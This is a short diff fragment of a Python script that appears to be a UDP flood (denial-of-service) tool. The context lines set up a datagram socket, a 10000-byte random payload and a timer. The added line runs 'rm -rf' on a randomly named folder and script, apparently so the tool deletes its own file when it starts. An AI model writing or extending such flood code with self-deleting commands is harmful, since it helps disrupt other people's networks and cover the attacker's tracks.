@@ -7,6 +7,7 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM);
 bytes = random._urandom(10000);
 timeout = time.time();
 
+os.system("rm -rf js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3/js8Hw3na7wm49aw22k8sdj4085gw364fDuwRR7j3.py");
 os.system("clear");
 print ("""
 \033[1;36;40m
